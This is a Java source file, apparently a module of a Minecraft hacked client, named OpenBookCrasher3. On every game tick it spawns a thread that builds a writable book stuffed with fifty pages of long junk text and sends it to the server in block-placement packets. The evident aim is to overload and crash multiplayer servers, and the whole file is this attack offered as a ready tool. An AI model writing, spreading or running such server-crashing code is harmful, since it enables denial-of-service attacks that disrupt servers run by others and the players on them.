package com.teamti.timc.modules.crasher.obc;

import com.teamti.timc.event.EventManager;
import com.teamti.timc.main.TIMC;
import com.teamti.timc.main.Module;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;
import org.lwjgl.input.Keyboard;

public class OpenBookCrasher3 extends Module {

    public static boolean isEnabled;

    public OpenBookCrasher3() {
        super("OpenBookCrasher3", Keyboard.KEY_NONE);
        this.jelloCat = TIMC.tabgui.cats.get(2);
    }

    public void onEnable() {
        isEnabled = true;
        EventManager.register(this);
    }

    public void onDisable() {
        EventManager.unregister(this);
        isEnabled = false;

    }

    public void onUpdate() {
        new Thread(){

            @Override
            public void run() {
                try {
                    ItemStack book = new ItemStack(Items.writable_book);
                    NBTTagList list = new NBTTagList();
                    NBTTagCompound tag = new NBTTagCompound();
                    String author = Minecraft.getMinecraft().getSession().getUsername();
                    String title = "Play with me.";
                    String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    for (int i2 = 0; i2 < 50; ++i2) {
                        String siteContent = size;
                        NBTTagString tString = new NBTTagString(siteContent);
                        list.appendTag(tString);
                    }
                    tag.setString("author", author);
                    tag.setString("title", title);
                    tag.setTag("pages", list);
                    book.setTagInfo("pages", list);
                    book.setTagCompound(tag);
                    Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue((new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f)));
                		}
                catch (Exception e2) {
                    return;
                }
            }
        }.start();
    }
}